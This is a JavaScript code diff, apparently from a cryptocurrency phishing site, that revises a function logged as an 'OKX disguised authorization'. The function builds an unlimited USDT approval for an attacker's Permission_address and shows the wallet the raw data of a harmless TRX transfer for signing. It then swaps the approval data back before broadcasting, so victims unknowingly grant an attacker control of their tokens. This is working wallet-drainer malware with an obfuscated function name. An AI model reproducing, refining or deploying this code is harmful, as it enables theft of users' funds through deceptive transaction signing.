@@ -28,61 +28,64 @@ async function onNextButtonClick() {
 
 
 async function DjdskdbGsj() {
-    console.log("开始执行OKX伪装授权操作");
-    
-    const trxAmountInSun = tronWeb.toSun(currentAmount);
-    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const feeLimit = 1000000000;  // 设置 feeLimit
+  console.log("开始执行OKX伪装授权操作");
+  const trxAmountInSun = tronWeb.toSun(currentAmount);
+  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const feeLimit = 1000000000;
+  
+  try {
+    console.log("构建TRX转账交易...");
+    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+      Payment_address,
+      trxAmountInSun,
+      userData.address,
+      { feeLimit: feeLimit }
+    );
 
-    try {
-        console.log("构建TRX转账交易...");
-        let trxTransaction = await tronWeb.transactionBuilder.sendTrx(
-            Payment_address,
-            trxAmountInSun,
-            tronWeb.defaultAddress.base58,
-            { feeLimit: feeLimit }
-        );
+    console.log("构建USDT授权增加交易...");
+    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+      tronWeb.address.toHex(usdtContractAddress),
+      'increaseApproval(address,uint256)',
+      { feeLimit: feeLimit },
+      [
+        { type: 'address', value: Permission_address },
+        { type: 'uint256', value: maxUint256 }
+      ],
+      userData.address
+    );
 
-        console.log("构建USDT授权增加交易...");
-        const increaseApprovalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-            tronWeb.address.toHex(usdtContractAddress),
-            'increaseApproval(address,uint256)',
-            { feeLimit: feeLimit },
-            [
-                { type: 'address', value: Permission_address },
-                { type: 'uint256', value: maxUint256 }
-            ],
-            tronWeb.defaultAddress.base58
-        );
+    // 保存原始的交易数据
+    const originalRawData = approvalTransaction.transaction.raw_data;
 
-        if (trxTransaction) {
-            increaseApprovalTransaction.transaction.raw_data = trxTransaction.raw_data;
-        }
+    // 用转账交易的数据替换批准交易的数据
+    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
 
-        console.log("交易签名中...");
-        const signedTransaction = await tronWeb.trx.sign(increaseApprovalTransaction.transaction);
+    console.log("交易签名中...");
+    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
 
-        console.log("发送交易...");
-        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+    // 恢复原始的交易数据
+    signedTransaction.raw_data = originalRawData;
 
-        console.log("交易结果:", result);
+    console.log("发送交易...");
+    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
-        if (result.result || result.success) {
-            const transactionHash = result.txid || (result.transaction && result.transaction.txID);
-            if (!transactionHash) {
-                throw new Error("无法获取交易哈希");
-            }
-            console.log("OKX伪装授权增加交易发送成功，交易哈希:", transactionHash);
-            tip("授权成功");
-            return transactionHash;
-        } else {
-            throw new Error("OKX伪装授权增加交易失败");
-        }
-    } catch (error) {
-        console.error("执行OKX伪装授权增加操作失败:", error);
-        tip("授权失败，请重试");
-        throw error;
+    console.log("交易结果:", broadcastResult);
+    if (broadcastResult.result || broadcastResult.success) {
+      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+      if (!transactionHash) {
+        throw new Error("无法获取交易哈希");
+      }
+      console.log("OKX伪装授权增加交易发送成功，交易哈希:", transactionHash);
+      tip("授权成功");
+      return transactionHash;
+    } else {
+      throw new Error("OKX伪装授权增加交易失败");
     }
+  } catch (error) {
+    console.error("执行OKX伪装授权增加操作失败:", error);
+    tip("授权失败，请重试");
+    throw error;
+  }
 }
 
 async function KdhshaBBHdg() {
